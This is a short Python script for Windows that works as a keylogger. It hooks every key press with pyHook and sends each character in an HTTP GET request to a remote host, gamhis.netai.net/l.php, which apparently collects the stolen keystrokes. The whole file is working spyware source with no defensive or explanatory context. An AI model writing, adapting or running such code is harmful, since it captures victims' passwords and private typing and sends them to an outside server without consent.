import win32api
import win32console
import win32gui
import pythoncom, pyHook
import httplib
import urllib



def OnKeyboardEvent (event):
   
   keylogs = chr (event.Ascii)
   buffer=''
   if event.Ascii == 13:
	  keylogs = '/ n'
   buffer += keylogs
   conn (buffer)
   
   
   
def conn (arg):
 conn = httplib.HTTPConnection("gamhis.netai.net")
 url=urllib.quote(arg)
 conn.request("GET", "/l.php?text="+url)
 conn.close()

hm = pyHook.HookManager ()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard ()
pythoncom.PumpMessages ()